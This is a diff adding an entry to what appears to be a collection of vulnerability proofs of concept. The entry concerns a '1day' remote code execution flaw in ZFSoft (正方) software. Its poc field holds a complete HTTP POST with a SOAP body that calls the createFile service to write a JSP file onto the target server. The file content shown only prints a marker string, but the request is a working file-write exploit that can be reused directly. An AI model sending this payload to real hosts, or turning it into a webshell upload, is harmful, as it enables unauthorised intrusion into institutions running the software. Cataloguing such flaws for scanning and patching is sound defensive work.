@@ -1,0 +1,7 @@
+vendor = "正方"
+name = "正方rce"
+type = "RCE"
+source = "TG"
+date = "08.15"
+poc = "POST /zfca/axis/CreateCaFile HTTP/1.1 Content-Type: text/xml;charset=UTF-8 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7 Accept-Encoding: gzip, deflate SOAPAction: Cache-Control: no-cache Pragma: no-cache Host: XXXX Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 Content-Length: 710 <soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:pub=\"http://pubService.webServices.zfca.zfsoft.com\"> <soapenv:Header/> <soapenv:Body> <pub:createFile soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"> <filepath xsi:type=\"soapenc:string\" xmlns:soapenc=\"http://schemas.xmlsoap.org/soap/encoding/\">iflihdqs.jsp</filepath> <content xsi:type=\"soapenc:string\" xmlns:soapenc=\"http://schemas.xmlsoap.org/soap/encoding/\"> <![CDATA[ <% out.println(\"jryjfpak\"); %> ]]> </content> </pub:createFile> </soapenv:Body> </soapenv:Envelope>"
+label = "1day"
